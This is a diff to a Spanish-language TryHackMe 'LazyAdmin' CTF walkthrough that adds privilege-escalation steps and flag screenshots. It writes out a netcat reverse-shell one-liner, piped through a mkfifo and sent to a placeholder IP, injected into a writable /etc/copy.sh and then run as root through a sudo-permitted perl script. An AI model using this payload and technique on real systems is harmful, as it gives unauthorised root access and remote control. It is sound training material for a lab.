@@ -226,6 +226,8 @@ Con el comando `id`podemos ver que somos el usuario `www-data`. Para la escalaci
 
 Nos dirigimos al directorio home para ver a que carpeta de directorios de usuario tenemos acceso y vemos que la de itguy es accesible. Dentro de este usuario encontramos la primera flag:
 
+![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/user.png)
+
 #### Escalación de privilegios
 
 ```console
@@ -238,7 +240,7 @@ User www-data may run the following commands on THM-Chal:
     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 ```
 
-Como podemos ver, el usuario www-data puede ejecutar un archivo escrito en perl. Este archivo lo podemos modificar para obtener una nueva reverse shell pero esta vez con permisos de root. Para previsualizar el contenido de este archivo podemos hacer un cat:
+Como podemos ver, el usuario www-data puede ejecutar un archivo escrito en perl. Para previsualizar el contenido de este archivo podemos hacer un cat:
 
 ```console
 $ cat /home/itguy/backup.pl
@@ -246,8 +248,16 @@ $ cat /home/itguy/backup.pl
 
 system("sh", "/etc/copy.sh");
 ```
-
+Al revisar el código vemos que edita otro archivo `sh`del directorio `etc`, el cual si revisamos los permisos con `ls -l /etc/copy.sh`tenemos permiso para escribir contenidos en él. Con el comando `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $TU_IP 5757 >/tmp/f" > /etc/copy.sh`.
+Ahora ejecutamos el archivo en perl, no sin antes poner en escucha el puerto 5757:
+```console
 sudo /usr/bin/perl /home/itguy/backup.pl
+```
+#### Segunda Flag
+
+Si hacemos in id ya somos usuario root y ya podemos acceder al /root/root.txt:
+![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/rootflag.png)
+
 
 
 
